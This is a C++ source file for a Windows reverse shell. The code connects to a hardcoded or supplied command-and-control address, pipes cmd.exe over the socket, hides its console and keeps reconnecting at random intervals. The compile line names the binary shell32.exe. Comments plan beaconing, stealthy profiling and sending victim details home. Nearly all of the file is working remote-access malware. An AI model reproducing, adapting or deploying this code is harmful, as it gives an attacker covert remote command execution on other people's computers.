#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// credit to dev-frog
// to compile:
// i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
// in which the cmd.exe process is executes.

// Pseudo-code/outline
/* 
start program:
    start socket, init connection
    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
        if data = shell:
            spawn cmd.exe 
            -> upon exit, close process. 
            -> send message saying process closed (C2 catches message and closes interaction successfully)
        else if data = batch:
            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
            wait for 'quit' message which exits listening 'loop?'
        else if data = exit:
            kill socket
            kill process
            exit(0)
        else if data = info:
            get user, hostname, process name, users logged in, ip address, domain name, etc.
            make pretty
            send home
        

Notes and Questions:
    - How much of this is can be done with the WinAPI?
    - 
*/
void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep((srand(time(0)) % 20) + 5);    // Trys to reconnect every 5-25 seconds



        // Setup the connection
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;

        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);    




        // Check for error, if so, close socket and attempt reestablishment on next loop
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {


            // Recieve any form of data to spawn the cmd shell (1/2 init entries)
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);


            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            } // Upon receiving some sort of input
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;

                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;

                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

                WaitForSingleObject(pinfo.hProcess, INFINITE); // You are in the cmd.exe process, all input goes to that process and is not parsed by this program

                // Once the 'exit' command or signal is processed by cmd.exe and the process closes, these execute
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);


                // Wait for next input
                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }

            }
        }
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.75.100";  // change this to your ip address
        int port = 1337;                //chnage this to your open port
        RunShell(host, port);
    }
    return 0;
}